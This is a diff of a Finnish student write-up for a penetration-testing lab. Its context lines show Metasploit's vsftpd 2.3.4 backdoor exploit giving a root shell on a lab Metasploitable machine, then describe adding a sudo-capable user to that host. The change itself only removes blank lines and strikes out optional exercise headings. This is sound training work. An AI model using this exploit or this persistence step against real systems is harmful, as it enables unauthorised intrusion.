@@ -865,8 +865,6 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 [+] 192.168.56.8:21 - UID: uid=0(root) gid=0(root)
 [*] Found shell.
 [*] Command shell session 1 opened (192.168.56.5:33283 -> 192.168.56.8:6200 ) at 2022-04-09 16:45:57 +0300
-
-
 ```  
   
 Sain siis yhteyden Metasploitable koneelle. Yhteys on kuitenkin aika huono. En tiedä sanaa tämän kaltaiselle konsolille, mutta se tarjoaa vähän heikosti ominaisuuksia. Tahdoin parempaa, joten loin kohdekoneelle uuden käyttäjän, jonka lisäsin sudo ryhmään:
@@ -986,17 +984,17 @@ demon | admin sudo | Sudo-oikeudet
 demon2 | admin | Sudo-oikeudet
 demon3 | sudo | Ei sudo-oikeuksia
 
-## o) Vapaaehtoinen: Murtaudu Vulnhubista lataamaasi kuvaan.
+## ~~o) Vapaaehtoinen: Murtaudu Vulnhubista lataamaasi kuvaan.~~
 
-## p) Vapaaehtoinen: Jos viime kerran SQL injektiot jäivät mysteeriksi, voit tehdä ne nyt suuremmalla ymmärykselllä
+## ~~p) Vapaaehtoinen: Jos viime kerran SQL injektiot jäivät mysteeriksi, voit tehdä ne nyt suuremmalla ymmäryksellä~~
 
-## q) Vapaaehtoinen: Jatka HackTheBoxin parissa.
+## ~~q) Vapaaehtoinen: Jatka HackTheBoxin parissa.~~
 
-## r) Vapaaehtoinen: Tee lisää tehtäviä DVWA:sta.
+## ~~r) Vapaaehtoinen: Tee lisää tehtäviä DVWA:sta.~~
 
-## s) Vapaaehtoinen: Tee lisää tehtäviä WebGoatista.
+## ~~s) Vapaaehtoinen: Tee lisää tehtäviä WebGoatista.~~
 
-## t) Vapaaehtoinen: Tee lisää tehtäviä Over the Wiresta.
+## ~~t) Vapaaehtoinen: Tee lisää tehtäviä Over the Wiresta.~~
 
 Vinkit
 
